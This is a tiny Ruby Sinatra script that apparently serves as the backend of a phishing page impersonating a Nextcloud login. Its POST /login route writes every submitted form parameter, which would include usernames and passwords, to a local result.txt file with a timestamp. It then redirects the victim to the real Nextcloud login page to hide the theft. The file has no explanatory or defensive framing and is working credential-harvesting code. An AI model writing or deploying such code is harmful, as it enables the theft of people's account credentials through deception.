require 'sinatra'
post '/login' do
  open('./result.txt', 'a') do |f|
    f << "== #{Time.now}, params:#{params.inspect} \r\n"
  end
  redirect "https://projects.nextcloud.com/login"
end
